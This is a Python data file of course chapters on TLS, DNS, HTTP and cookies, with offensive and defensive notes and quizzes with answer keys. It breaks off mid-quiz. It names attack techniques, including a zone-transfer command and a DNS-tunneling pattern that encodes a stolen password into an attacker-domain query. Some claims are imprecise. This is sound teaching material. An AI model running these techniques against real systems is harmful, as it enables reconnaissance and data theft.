# -*- coding: utf-8 -*-
import json

def get_ch15_to_ch23():
    return [
        # CH 15
        {
            "id": "15",
            "module": "04 / SESSIONS & APPLICATION",
            "title": "L5-L6: sessions & TLS",
            "desc": "Understand TLS identity, key agreement, and the limits of encrypted transport.",
            "screensCount": 5,
            "sourceRange": "SOURCE 73-77",
            "simulator": "tls-handshake-sim",
            "badge": "Encryption & Trust",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 73,
                    "title": "The Cryptographic Triad: Confidentiality, Integrity, Identity",
                    "summary": "Why transport layer security is required and what encryption does not hide.",
                    "concept": "Transport Layer Security (TLS) sits between Transport (TCP) and Application (HTTP) to provide:\n1. Confidentiality: Symmetric encryption (AES-256-GCM, ChaCha20-Poly1305) ensures eavesdroppers cannot read payloads.\n2. Integrity: Cryptographic authentication tags (GMAC/Poly1305) guarantee packets cannot be modified in transit.\n3. Authentication & Identity: X.509 digital certificates verify the server is genuinely who it claims to be.\nCrucial Security Reality: TLS encrypts the PAYLOAD, but metadata remains visible: Source/Dest IP, Source/Dest Port, Packet Size, Timing, and Server Name Indication (SNI).",
                    "cyberLens": {
                        "offensive": "Traffic Analysis: Even when traffic is encrypted with TLS, attackers and state surveillance can deduce user behavior (e.g., distinguishing a video stream from medical search) based on packet sizes, frequencies, and unencrypted SNI domain headers.",
                        "defensive": "Encrypted Client Hello (ECH / ESNI) closes the SNI privacy leak by encrypting the destination domain name during the initial TLS handshake."
                    },
                    "keyPoints": [
                        "TLS secures applications without requiring changes to underlying TCP/IP.",
                        "Encryption hides content, but network metadata (IP, port, timing) is still exposed.",
                        "TLS 1.3 is the modern gold standard (TLS 1.0 and 1.1 are deprecated and insecure)."
                    ],
                    "quiz": {
                        "question": "What critical piece of connection metadata was historically transmitted in cleartext during the TLS Client Hello before Encrypted Client Hello (ECH)?",
                        "options": [
                            "The user's credit card password",
                            "The Server Name Indication (SNI) revealing the exact domain name being visited",
                            "The server's private encryption key",
                            "The operating system serial number"
                        ],
                        "answer": 1,
                        "explanation": "SNI (Server Name Indication) sends the target hostname in cleartext so multi-tenant servers know which certificate to return, allowing network eavesdroppers to see which websites you visit."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 74,
                    "title": "Public Key Infrastructure (PKI) & Digital Certificates",
                    "summary": "Asymmetric cryptography, Certificate Authorities (CAs), and the chain of trust.",
                    "concept": "How do you know `google.com` is really Google and not a hacker in your coffee shop?\n- Asymmetric Key Pair: Server has a Public Key (distributed to everyone) and a Private Key (kept secret on the server).\n- Certificate Authority (CA): A trusted third party (e.g. Let's Encrypt, DigiCert) that cryptographically signs the server's certificate containing its public key.\n- Chain of Trust: Server Certificate -> Intermediate CA -> Root CA.\n- Root Stores: Operating systems and web browsers come pre-installed with trusted Root CA public certificates.",
                    "cyberLens": {
                        "offensive": "Rogue CA & Internal Root Installation: If an attacker installs a malicious Root CA certificate onto a victim's machine (or inside a corporate MDM profile), the attacker can decrypt and inspect ALL TLS HTTPS traffic without any browser warnings!",
                        "defensive": "Certificate Transparency (CT) logs: Public, append-only cryptographic logs where all issued SSL certificates must be logged, allowing domain owners to detect fraudulent rogue certificates."
                    },
                    "keyPoints": [
                        "Asymmetric keys solve the key distribution problem.",
                        "Trust is hierarchical: your browser trusts Root CAs, who vouch for website certificates.",
                        "Never click past browser SSL certificate warnings on untrusted networks."
                    ],
                    "quiz": {
                        "question": "Why does a web browser display a severe 'Your connection is not private' security warning when encountering a self-signed certificate?",
                        "options": [
                            "Because self-signed certificates do not use math.",
                            "Because the certificate was not signed by a recognized Certificate Authority in the browser's pre-trusted root store.",
                            "Because the website is using Wi-Fi.",
                            "Self-signed certificates cannot encrypt data."
                        ],
                        "answer": 1,
                        "explanation": "Self-signed certificates encrypt traffic just fine, but anyone can create one claiming to be any domain. Without a trusted third-party CA signature, the browser cannot verify the server's genuine identity."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 75,
                    "title": "The TLS 1.3 Handshake & Diffie-Hellman Key Exchange",
                    "summary": "Ephemeral Elliptic-Curve Diffie-Hellman (ECDHE) and Perfect Forward Secrecy (PFS).",
                    "concept": "TLS 1.3 streamlined the handshake down to a single Round Trip Time (1-RTT):\n1. Client Hello: Sends supported cipher suites, random nonce, and Client Diffie-Hellman Key Share.\n2. Server Hello: Selects cipher suite, sends Server Diffie-Hellman Key Share, Encrypted Extensions, Server Certificate, and Finished HMAC.\n3. Both sides compute the Shared Symmetric Master Key independently using Ephemeral Diffie-Hellman math.\n4. Application Data starts flowing immediately!\nPerfect Forward Secrecy (PFS): Because a new temporary (ephemeral) key pair is generated for every single session, compromising the server's permanent private key in the future CANNOT decrypt past recorded traffic!",
                    "cyberLens": {
                        "offensive": "Historical Eavesdropping (Store Now, Decrypt Later): Nation-state actors record petabytes of encrypted traffic. Without PFS (e.g., legacy RSA key exchange in TLS 1.2), obtaining the server private key years later decodes all past captures.",
                        "defensive": "TLS 1.3 completely banned static RSA key exchanges, mandating Ephemeral Diffie-Hellman (ECDHE) for mandatory Perfect Forward Secrecy."
                    },
                    "keyPoints": [
                        "TLS 1.3 cut connection latency in half (1-RTT vs 2-RTT in TLS 1.2).",
                        "Ephemeral Diffie-Hellman allows two parties to create a shared secret over an insecure channel.",
                        "Perfect Forward Secrecy prevents retroactively decrypting archived PCAPs."
                    ],
                    "quiz": {
                        "question": "What is the primary security guarantee of Perfect Forward Secrecy (PFS)?",
                        "options": [
                            "It guarantees the server will never crash.",
                            "Compromising the server's long-term private key in the future cannot be used to decrypt past recorded encrypted sessions.",
                            "It makes passwords 100 characters long.",
                            "It blocks all phishing emails."
                        ],
                        "answer": 1,
                        "explanation": "PFS uses unique ephemeral keys for each session. If the server's long-term private key is stolen later, past sessions remain undecryptable because the ephemeral keys were discarded from memory."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 76,
                    "title": "SSL Stripping & Downgrade Attacks",
                    "summary": "Exploiting user habit and initial HTTP redirects (Moxie Marlinspike's SSLstrip).",
                    "concept": "Most users type `bank.com` instead of `https://bank.com`. The browser initially sends an unencrypted HTTP request, and the server returns a `301 Moved Permanently` redirect to HTTPS.\nHow SSLstrip (MITM) Works:\n1. Attacker intercepts victim's initial cleartext HTTP request.\n2. Attacker establishes a secure HTTPS session with the real bank server.\n3. Attacker rewrites all HTTPS links on the bank's response to HTTP (`https://` -> `http://`) and strips security headers.\n4. Attacker serves the downgraded HTTP page to the victim.\n5. Victim submits username and password over cleartext HTTP directly into the attacker's sniffer!",
                    "cyberLens": {
                        "offensive": "SSLstrip bypasses TLS encryption entirely without triggering certificate errors because the victim communicates purely over unencrypted HTTP.",
                        "defensive": "HTTP Strict Transport Security (HSTS): A response header (`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`) that instructs browsers to NEVER load the site over HTTP, hardcoding HTTPS in browser firmware."
                    },
                    "keyPoints": [
                        "Initial unencrypted HTTP redirects are the Achilles' heel of web security.",
                        "SSLstrip turns HTTPS into HTTP transparently.",
                        "HSTS Preload lists eliminate the initial HTTP redirect vulnerability completely."
                    ],
                    "quiz": {
                        "question": "Which security mechanism prevents SSL Stripping attacks by commanding browsers to refuse all unencrypted HTTP connections to a domain?",
                        "options": [
                            "DNSSEC",
                            "HTTP Strict Transport Security (HSTS)",
                            "BGP Filtering",
                            "Traceroute"
                        ],
                        "answer": 1,
                        "explanation": "HSTS instructs browsers to automatically convert any http:// requests into https:// internally before sending them over the wire, closing the window for SSLstrip."
                    }
                },
                {
                    "screenNumber": 5,
                    "globalSource": 77,
                    "title": "Enterprise TLS Inspection & mTLS",
                    "summary": "SSL Decryption Proxies, Next-Gen Firewalls, and Mutual TLS zero-trust microservices.",
                    "concept": "- Enterprise TLS Inspection: Over 95% of web traffic is encrypted, including malware C2 and data theft. Enterprise firewalls act as a deliberate Man-in-the-Middle:\n  1. The organization installs its custom Root CA on all corporate workstations.\n  2. The firewall intercepts outbound HTTPS requests, terminates TLS with the remote server, inspects payload for malware/DLP, and re-encrypts using a dynamically generated certificate signed by the corporate CA.\n- Mutual TLS (mTLS): In standard TLS, only the server proves its identity. In mTLS, BOTH client and server present X.509 certificates, authenticating both sides cryptographically (standard for Kubernetes and Zero Trust APIs).",
                    "cyberLens": {
                        "offensive": "Certificate Pinning: Mobile apps hardcode the server's public key fingerprint in app code, causing the app to crash if an enterprise TLS inspection proxy attempts decryption.",
                        "defensive": "mTLS shuts down unauthorized API abuse: even if an attacker discovers an API endpoint, requests without a valid client certificate are rejected at the TCP/TLS layer."
                    },
                    "keyPoints": [
                        "Enterprises must decrypt TLS to detect outbound data exfiltration.",
                        "Installing a corporate Root CA allows full decryption of employee traffic.",
                        "mTLS provides cryptographic identity for microservice-to-microservice traffic."
                    ],
                    "quiz": {
                        "question": "What is the key difference between standard TLS and Mutual TLS (mTLS)?",
                        "options": [
                            "mTLS uses two internet cables.",
                            "In mTLS, both the client and the server validate each other's digital certificates, ensuring bi-directional cryptographic authentication.",
                            "mTLS does not use encryption.",
                            "Standard TLS only works on mobile phones."
                        ],
                        "answer": 1,
                        "explanation": "Standard TLS only verifies the server's identity to the client. mTLS requires the client to also present a valid digital certificate, proving its identity to the server."
                    }
                }
            ]
        },

        # CH 16
        {
            "id": "16",
            "module": "04 / SESSIONS & APPLICATION",
            "title": "L7: the application layer & DNS",
            "desc": "Resolve names into addresses and use DNS records to understand infrastructure.",
            "screensCount": 5,
            "sourceRange": "SOURCE 78-82",
            "simulator": "dns-resolver-sim",
            "badge": "DNS Architecture",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 78,
                    "title": "The Global DNS Hierarchy",
                    "summary": "The tree structure: Root Servers, Top-Level Domains (TLDs), and Authoritative Name Servers.",
                    "concept": "The Domain Name System (DNS) is the global decentralized phonebook of the Internet:\n1. Root Domain (`.`): 13 logical root server IP addresses (managed by ICANN, operated via Anycast across over 1,500 global instances).\n2. Top-Level Domains (TLD): Generic (.com, .org, .net) managed by registries like Verisign; country-codes (.uk, .de, .in).\n3. Second-Level Domain: `example.com` registered by an organization.\n4. Subdomain: `api.example.com` or `dev.internal.example.com`.\n5. Authoritative Name Server: The server that holds the official source-of-truth DNS zone file for a domain.",
                    "cyberLens": {
                        "offensive": "Subdomain Enumeration: Attackers use brute-force wordlists and certificate search engines (crt.sh) to find forgotten subdomains (`dev.example.com`, `vpn.example.com`) that often run vulnerable, unpatched software.",
                        "defensive": "Attack surface management monitors public DNS zones to decommission stale subdomains and prevent subdomain takeover vulnerabilities."
                    },
                    "keyPoints": [
                        "DNS reads right-to-left: Root -> TLD -> Domain -> Hostname.",
                        "Root servers are represented by letters A through M.",
                        "DNS operates over UDP port 53 (and TCP 53 for large replies/zone transfers)."
                    ],
                    "quiz": {
                        "question": "What entity sits at the very pinnacle of the hierarchical DNS naming tree?",
                        "options": [
                            "The .com TLD",
                            "The Root Zone represented by a dot (.)",
                            "Google Public DNS",
                            "The local home router"
                        ],
                        "answer": 1,
                        "explanation": "At the very top of the DNS inverted tree hierarchy is the Root Zone, represented by a single dot (.)."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 79,
                    "title": "Recursive vs Iterative Resolution",
                    "summary": "The journey of a DNS query from stub resolver to the final authoritative answer.",
                    "concept": "When you type `www.example.com`:\n1. Stub Resolver: Local OS asks your configured Recursive Resolver (e.g. `8.8.8.8` or ISP DNS) with a Recursive Query ('Do the full work and give me the answer').\n2. Recursive Resolver performs Iterative Queries ('If you don't know, tell me who to ask next'):\n   - Asks Root Server -> Root replies: 'Go ask the .com TLD server at IP X.X.X.X'.\n   - Asks .com TLD Server -> TLD replies: 'Go ask example.com's Authoritative Name Server at Y.Y.Y.Y'.\n   - Asks Authoritative Server -> Authoritative replies: '`www.example.com` is at 93.184.216.34'.\n3. Recursive Resolver caches the record for the duration of the TTL and delivers answer to client.",
                    "cyberLens": {
                        "offensive": "Open Resolvers: Attackers scan for misconfigured recursive resolvers accessible to the public Internet to use as reflectors in massive DNS amplification DDoS attacks.",
                        "defensive": "Internal DNS resolvers must be firewalled and configured to only answer queries originating from authorized corporate internal subnets."
                    },
                    "keyPoints": [
                        "Recursive query means 'find the final answer for me'.",
                        "Iterative query means 'give me the best referral you have'.",
                        "TTL (Time to Live) governs how long intermediate resolvers cache responses."
                    ],
                    "quiz": {
                        "question": "What is the difference between an authoritative DNS server and a recursive DNS resolver?",
                        "options": [
                            "Authoritative servers only work on Linux.",
                            "Authoritative servers hold the official DNS zone records for a domain; recursive resolvers query the hierarchy on behalf of clients and cache the results.",
                            "Recursive servers cannot connect to the internet.",
                            "There is no difference."
                        ],
                        "answer": 1,
                        "explanation": "An authoritative server holds the original, definitive record for a domain. A recursive resolver does the legwork of querying root, TLD, and authoritative servers, caching the result."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 80,
                    "title": "DNS Record Types & Reconnaissance",
                    "summary": "A, AAAA, CNAME, MX, TXT, NS, PTR, SOA, and SRV records: mapping the target's infrastructure.",
                    "concept": "- A: Maps domain to IPv4 (`example.com` -> `93.184.216.34`).\n- AAAA: Maps domain to IPv6 (`example.com` -> `2606:2800:220:1:248:1893:25c8:1946`).\n- CNAME (Canonical Name): Alias pointing to another domain (`www.example.com` -> `example.com`).\n- MX (Mail Exchange): Mail server prioritizing email delivery (`mail.example.com`, priority 10).\n- TXT: Human/machine text strings; used for SPF verification, Google domain ownership, and DKIM.\n- NS (Name Server): Specifies authoritative DNS servers for the zone.\n- PTR (Pointer): Reverse DNS; maps IP to domain name (in `in-addr.arpa`).\n- SOA (Start of Authority): Zone administrator, serial number, refresh timers.",
                    "cyberLens": {
                        "offensive": "DNS Zone Transfer (AXFR): Misconfigured name servers that allow unauthenticated zone transfers (`dig axfr @ns1.target.com target.com`) dump the entire internal network blueprint to the attacker in one command!\nTXT records frequently leak internal SaaS platforms (Atlassian, Slack, Sendgrid).",
                        "defensive": "Restrict AXFR zone transfers strictly to authorized secondary slave name servers via Access Control Lists or TSIG keys."
                    },
                    "keyPoints": [
                        "A is for IPv4, AAAA is for IPv6.",
                        "TXT records are the backbone of email authentication and cloud service verification.",
                        "Unrestricted AXFR zone transfers are an instant critical security finding."
                    ],
                    "quiz": {
                        "question": "Which DNS query command attempts to download the complete zone file of all records from a target name server?",
                        "options": [
                            "dig A target.com",
                            "dig axfr @ns1.target.com target.com",
                            "ping target.com",
                            "nslookup -type=ptr target.com"
                        ],
                        "answer": 1,
                        "explanation": "AXFR is the DNS zone transfer protocol. If a name server is misconfigured to allow public zone transfers, `dig axfr` dumps all domain records."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 81,
                    "title": "DNS Cache Poisoning & The Kaminsky Flaw",
                    "summary": "Injecting fraudulent IP mappings into recursive resolver caches.",
                    "concept": "How DNS Cache Poisoning Works:\n1. Attacker sends query for `fake.target.com` to target recursive resolver.\n2. Resolver asks authoritative server, waiting for response with matching 16-bit Transaction ID (TXID).\n3. Attacker floods resolver with thousands of forged responses claiming `target.com is at Attacker IP` guessing different TXIDs.\n4. Dan Kaminsky's Attack (2008): By querying random non-existent subdomains (`1234.target.com`, `1235.target.com`), the attacker can make millions of attempts without waiting for TTL expiration until winning the TXID race and injecting malicious authoritative NS records!\n5. Result: All users using that resolver are redirected to phishing sites.",
                    "cyberLens": {
                        "offensive": "Cache poisoning compromises all users of an ISP or corporate resolver simultaneously without touching individual endpoints.",
                        "defensive": "Source Port Randomization (using random UDP source ports 1024-65535 in addition to 16-bit TXID expands entropy from 65,536 to ~1 billion combinations) and DNSSEC cryptographic signing."
                    },
                    "keyPoints": [
                        "DNS transactions historically matched only a 16-bit query ID (TXID).",
                        "Source Port Randomization drastically increased brute-force difficulty.",
                        "DNSSEC provides cryptographic digital signatures on DNS records to defeat spoofing."
                    ],
                    "quiz": {
                        "question": "What protocol upgrade cryptographically signs DNS records using public key cryptography to eliminate DNS cache poisoning?",
                        "options": [
                            "DNSSEC (DNS Security Extensions)",
                            "BGP",
                            "DHCP Snooping",
                            "IPv6"
                        ],
                        "answer": 0,
                        "explanation": "DNSSEC introduces cryptographic signatures (RRSIG) validated through a chain of trust (DNSKEY, DS records) back to the root zone, making forged replies mathematically impossible to inject."
                    }
                },
                {
                    "screenNumber": 5,
                    "globalSource": 82,
                    "title": "DNS Tunneling & Data Exfiltration",
                    "summary": "Bypassing firewalls and captive portals by encoding binary data inside DNS queries.",
                    "concept": "Almost all locked networks (hotel captive portals, air-gapped subnets, restricted corporate workstations) permit outbound UDP port 53 queries so domain resolution works.\nHow DNS Tunneling Works:\n1. Attacker registers domain `c2.attacker.com` and configures their own server as authoritative NS.\n2. Malware on infected host encodes stolen data into subdomains: `base64(stolen_password).c2.attacker.com`.\n3. The host asks the local corporate resolver.\n4. The resolver recursively forwards the query out to the Attacker's Authoritative NS.\n5. Attacker server extracts base64 data, decodes it, and sends commands back inside TXT record replies!\nTools: `iodine`, `dnscat2`, `Cobalt Strike DNS beacon`.",
                    "cyberLens": {
                        "offensive": "DNS tunneling creates bidirectional covert communication channels through restrictive egress firewalls without direct IP connections.",
                        "defensive": "DNS telemetry monitoring: Detect tunneling by analyzing query volume, abnormally long subdomain character lengths (>50 chars), high Shannon entropy (randomness), and high TXT record ratios."
                    },
                    "keyPoints": [
                        "DNS is the ultimate covert exfiltration channel because port 53 is rarely blocked.",
                        "Data is encoded in query subdomains and returned in TXT/CNAME records.",
                        "DNS monitoring and Response Policy Zones (RPZ) detect tunneling in real time."
                    ],
                    "quiz": {
                        "question": "Which heuristic feature in network traffic logs is the strongest indicator of a malware DNS tunneling attack?",
                        "options": [
                            "A query for google.com once a day.",
                            "A massive volume of high-entropy, unusually long subdomains (e.g. a8f73b190c.c2.attacker.com) sent to an authoritative name server.",
                            "A ping packet with TTL=64.",
                            "An ARP request for the gateway."
                        ],
                        "answer": 1,
                        "explanation": "DNS tunneling encodes binary data into base32/base64 subdomains, generating thousands of unique, random-looking (high entropy), excessively long queries for the same parent domain."
                    }
                }
            ]
        },

        # CH 17
        {
            "id": "17",
            "module": "04 / SESSIONS & APPLICATION",
            "title": "L7: HTTP & HTTPS",
            "desc": "Read requests, methods, status codes, headers, and HTTP versions.",
            "screensCount": 6,
            "sourceRange": "SOURCE 83-88",
            "simulator": "http-inspector-builder",
            "badge": "Web Foundations",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 83,
                    "title": "The Raw HTTP Request Architecture",
                    "summary": "Method, URI, Protocol Version, Headers, and Body separated by CRLF.",
                    "concept": "Hypertext Transfer Protocol (HTTP) is a cleartext ASCII request-response protocol running over TCP:\nStructure of an HTTP Request:\n```\nGET /login.php?user=admin HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nUser-Agent: Mozilla/5.0...\\r\\n\nAccept: text/html\\r\\n\nAuthorization: Bearer token123\\r\\n\n\\r\\n\n[Optional Request Body Payload]\n```\nKey Header Rules:\n- Lines are strictly terminated by CRLF (`\\r\\n` = Carriage Return + Line Feed).\n- A blank line (`\\r\\n\\r\\n`) signals the exact end of headers and start of the body.",
                    "cyberLens": {
                        "offensive": "CRLF Injection & HTTP Request Smuggling: Injecting `%0d%0a` (`\\r\\n`) into headers allows attackers to forge response headers (setting fake cookies) or desynchronize front-end reverse proxies from backend servers (Request Smuggling).",
                        "defensive": "Modern web frameworks strip raw CR and LF characters from user inputs before setting HTTP headers."
                    },
                    "keyPoints": [
                        "HTTP is stateless: each request is independent.",
                        "The Host header is mandatory in HTTP/1.1 (enabling virtual hosting).",
                        "CRLF is the foundational delimiter in HTTP/1.1."
                    ],
                    "quiz": {
                        "question": "What sequence of ASCII characters marks the end of the HTTP header block and the beginning of the body?",
                        "options": [
                            "END_OF_HEADER",
                            "A single space",
                            "A double CRLF (\\r\\n\\r\\n)",
                            "Four zeros"
                        ],
                        "answer": 2,
                        "explanation": "In HTTP/1.1, headers are separated from the body payload by an empty line containing just CRLF, producing the two-byte-by-two-byte sequence `\\r\\n\\r\\n`."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 84,
                    "title": "HTTP Methods & RESTful Semantics",
                    "summary": "Safe vs Idempotent methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, and HEAD.",
                    "concept": "- Safe Methods (Read-only, do not alter server state): GET, HEAD, OPTIONS.\n- Idempotent Methods (Executing 1 time has the exact same result as executing 100 times): GET, HEAD, PUT, DELETE.\n- Non-Idempotent Methods: POST (creates new resource every execution), PATCH (partial modification).\n- HEAD: Exactly identical to GET, but server returns ONLY headers (no body); used for caching checks.\n- OPTIONS: Informs client which methods are supported (crucial for CORS pre-flight).",
                    "cyberLens": {
                        "offensive": "HTTP Verb Tampering: Legacy firewalls configured to block `GET /admin` or `POST /admin` can sometimes be bypassed by using alternative verbs like `HEAD`, `PUT`, or arbitrary verbs if the application backend handles authentication insecurely.",
                        "defensive": "Authentication and authorization filters must apply universally to all HTTP methods, not just GET and POST."
                    },
                    "keyPoints": [
                        "GET sends parameters in URL query string (logged in access logs and browser history).",
                        "POST sends sensitive credentials in the encrypted request body.",
                        "OPTIONS preflight queries verify Cross-Origin Resource Sharing (CORS) permissions."
                    ],
                    "quiz": {
                        "question": "Why should sensitive credentials like passwords never be sent via an HTTP GET request parameter?",
                        "options": [
                            "GET requests are restricted to 5 characters.",
                            "GET query parameters appear in plaintext in web server access logs, browser history, proxy logs, and Referer headers.",
                            "GET requests cannot use TLS encryption.",
                            "GET only works on weekends."
                        ],
                        "answer": 1,
                        "explanation": "URL query strings in GET requests are cached in browser history and recorded in plaintext in intermediate proxy and server access logs, leaking passwords."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 85,
                    "title": "HTTP Status Codes Demystified",
                    "summary": "1xx Informational, 2xx Success, 3xx Redirection, 4xx Client Error, 5xx Server Error.",
                    "concept": "The 3-digit status code tells the client what happened:\n- 1xx: Informational (101 Switching Protocols to WebSocket).\n- 2xx: Success (200 OK, 201 Created, 204 No Content).\n- 3xx: Redirection (301 Moved Permanently, 302 Found/Temporary, 304 Not Modified).\n- 4xx: Client Error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests).\n- 5xx: Server Error (500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout).",
                    "cyberLens": {
                        "offensive": "Error-Based Reconnaissance: 500 errors often dump full stack traces revealing database passwords, framework versions, and internal file paths. Differentiating 401 (needs login) from 403 (logged in but forbidden) maps internal access control trees.",
                        "defensive": "Custom generic error pages: Never display stack traces or debug info in production responses."
                    },
                    "keyPoints": [
                        "401 means unauthenticated (who are you?); 403 means unauthorized (you can't access this).",
                        "301 redirects are cached permanently by browsers.",
                        "502/504 errors indicate issues between reverse proxies and backend application servers."
                    ],
                    "quiz": {
                        "question": "What is the critical semantic difference between HTTP status code 401 Unauthorized and 403 Forbidden?",
                        "options": [
                            "401 means the server is turned off; 403 means the server is on.",
                            "401 indicates missing or invalid authentication credentials (user must log in); 403 means the user identity is known but lacks permission to view the resource.",
                            "401 is for Windows; 403 is for Linux.",
                            "They are completely identical."
                        ],
                        "answer": 1,
                        "explanation": "401 means 'authentication required' (log in first). 403 means the server understands who you are, but refuses authorization based on permissions."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 86,
                    "title": "Crucial Security Headers",
                    "summary": "HSTS, CSP, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy.",
                    "concept": "Security headers in HTTP responses harden browsers against common client-side exploits:\n- `Content-Security-Policy (CSP)`: Specifies authorized domains for scripts, styles, images (the primary defense against Cross-Site Scripting XSS).\n- `Strict-Transport-Security (HSTS)`: Enforces HTTPS strictly.\n- `X-Frame-Options: DENY` (or `SAMEORIGIN`): Prevents site from being embedded inside an iframe (defeats Clickjacking attacks).\n- `X-Content-Type-Options: nosniff`: Prevents MIME-sniffing attacks where browser executes a JPG image containing malicious JavaScript.",
                    "cyberLens": {
                        "offensive": "Missing Headers Audit: Red teams inspect security headers on every target using tools like `curl -I` or `securityheaders.com`. A missing X-Frame-Options allows instantaneous Clickjacking credential theft.",
                        "defensive": "Automated CI/CD security linters verify that all web applications deploy strong CSP, HSTS, and nosniff headers by default."
                    },
                    "keyPoints": [
                        "CSP is the ultimate defense against stored and reflected XSS.",
                        "X-Frame-Options stops Clickjacking dead in its tracks.",
                        "nosniff stops browsers from interpreting text files as executable scripts."
                    ],
                    "quiz": {
                        "question": "Which HTTP response header prevents Clickjacking attacks by forbidding malicious sites from rendering your web page inside an invisible iframe?",
                        "options": [
                            "X-Frame-Options: DENY",
                            "Server: Apache",
                            "Content-Type: text/html",
                            "Accept-Encoding: gzip"
                        ],
                        "answer": 0,
                        "explanation": "Setting `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`) instructs the browser to refuse to render the page inside any `<frame>`, `<iframe>`, or `<embed>` element."
                    }
                },
                {
                    "screenNumber": 5,
                    "globalSource": 87,
                    "title": "HTTP Evolution: HTTP/1.1 vs HTTP/2 vs HTTP/3",
                    "summary": "Text pipes vs Binary framing streams vs QUIC UDP datagrams.",
                    "concept": "- HTTP/1.1 (1997): Plaintext ASCII, sequential requests, suffers from Head-of-Line blocking (browsers open 6 parallel TCP connections per domain to compensate).\n- HTTP/2 (2015): Binary framing layer, multiplexes hundreds of concurrent requests/responses over a SINGLE TCP connection, header compression (HPACK), server push.\n- HTTP/3 (2020): Runs over QUIC/UDP, eliminates TCP head-of-line blocking, integrates TLS 1.3 handshake, QPACK header compression.",
                    "cyberLens": {
                        "offensive": "HTTP/2 Rapid Reset Attack (CVE-2023-44487): Exploiting HTTP/2 stream multiplexing, attackers send thousands of requests and immediately cancel them with RST_STREAM frames. Servers waste CPU processing cancellations, enabling record-breaking 398 million request/sec DDoS attacks!",
                        "defensive": "Web servers and reverse proxies must enforce aggressive rate limits on concurrent stream resets."
                    },
                    "keyPoints": [
                        "HTTP/1.1 is text-based; HTTP/2 and HTTP/3 are binary-based.",
                        "HTTP/2 multiplexes over one TCP connection; HTTP/3 runs over UDP.",
                        "HTTP/2 protocol complexity introduced novel DDoS attack vectors like Rapid Reset."
                    ],
                    "quiz": {
                        "question": "What transport layer protocol powers HTTP/3 to eliminate TCP head-of-line blocking?",
                        "options": [
                            "TCP",
                            "UDP (via QUIC)",
                            "ICMP",
                            "SCTP"
                        ],
                        "answer": 1,
                        "explanation": "HTTP/3 replaces TCP with QUIC, an encrypted transport protocol built directly on top of UDP."
                    }
                },
                {
                    "screenNumber": 6,
                    "globalSource": 88,
                    "title": "Reverse Proxies, CDNs, & Web Load Balancers",
                    "summary": "NGINX, Cloudflare, HAProxy: caching, TLS termination, and request routing.",
                    "concept": "- Forward Proxy: Sits in front of CLIENTS (hides client IPs, filters employee web browsing).\n- Reverse Proxy: Sits in front of SERVERS (NGINX, Envoy, Cloudflare). Handles TLS termination, load balancing, caching, and WAF inspection before forwarding clean requests to internal microservices.\n- Content Delivery Network (CDN): Geographically distributed reverse proxies that cache static assets (images, CSS, JS) at edge servers near users.",
                    "cyberLens": {
                        "offensive": "Bypassing WAF / Origin IP Discovery: If an attacker discovers the real origin server IP behind Cloudflare (via historical DNS records, SSL certificate search on Censys, or outbound webhook callbacks), they can attack the origin directly, bypassing all Cloudflare DDoS and WAF protections!",
                        "defensive": "Origin server firewall rules must strictly drop all inbound connections except those originating from the CDN's verified public IP ranges."
                    },
                    "keyPoints": [
                        "Forward proxies protect clients; reverse proxies protect servers.",
                        "TLS termination offloads heavy cryptography from application servers.",
                        "Always firewall the origin IP so attackers cannot bypass your Cloudflare/WAF."
                    ],
                    "quiz": {
                        "question": "What dangerous consequence occurs if an attacker discovers the direct origin IP address of a web server protected by a Cloudflare CDN and WAF?",
                        "options": [
                            "The attacker can send traffic directly to the origin server, completely bypassing Cloudflare's WAF inspection and DDoS mitigation.",
                            "The website automatically becomes open source.",
                            "The server's hard drive reformats.",
                            "Cloudflare deletes the domain."
                        ],
                        "answer": 0,
                        "explanation": "If the origin server is exposed to the public Internet, an attacker can bypass all CDN-level protections (WAF, rate limits, DDoS defenses) by directing exploits directly at the origin IP."
                    }
                }
            ]
        },

        # CH 18
        {
            "id": "18",
            "module": "04 / SESSIONS & APPLICATION",
            "title": "L7: cookies & sessions",
            "desc": "See how a stateless protocol carries authenticated sessions.",
            "screensCount": 4,
            "sourceRange": "SOURCE 89-92",
            "simulator": "cookie-lab-sim",
            "badge": "State & Identity",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 89,
                    "title": "The Stateless Problem & The Cookie Solution",
                    "summary": "How `Set-Cookie` and `Cookie` headers maintain state across HTTP requests.",
                    "concept": "HTTP has no memory: Request #2 has zero knowledge of Request #1.\nCookies bridge this gap:\n1. Client posts credentials: `POST /login`.\n2. Server validates password and returns header:\n   `Set-Cookie: session_id=abc123xyz; Path=/; Domain=.example.com`\n3. Browser stores cookie in local cookie jar.\n4. On EVERY subsequent request to that domain, browser automatically includes:\n   `Cookie: session_id=abc123xyz`\n5. Server looks up session ID in Redis/database to identify user.",
                    "cyberLens": {
                        "offensive": "Session Prediction & Brute Force: Weak pseudo-random session IDs (e.g. sequential integers or MD5 of timestamp) allow attackers to predict other active user session IDs and hijack their accounts without a password.",
                        "defensive": "Session IDs must be generated using cryptographically secure random number generators (CSPRNG) with at least 128 bits of entropy."
                    },
                    "keyPoints": [
                        "Cookies are automatically sent by browsers on every matching domain request.",
                        "A session ID is a digital valet ticket representing your authenticated login state.",
                        "Weak session randomness leads to instant account takeover."
                    ],
                    "quiz": {
                        "question": "Which HTTP response header is sent by a web server to store a session token inside the client's browser?",
                        "options": [
                            "Get-Cookie",
                            "Set-Cookie",
                            "Session-Token",
                            "Authorization"
                        ],
                        "answer": 1,
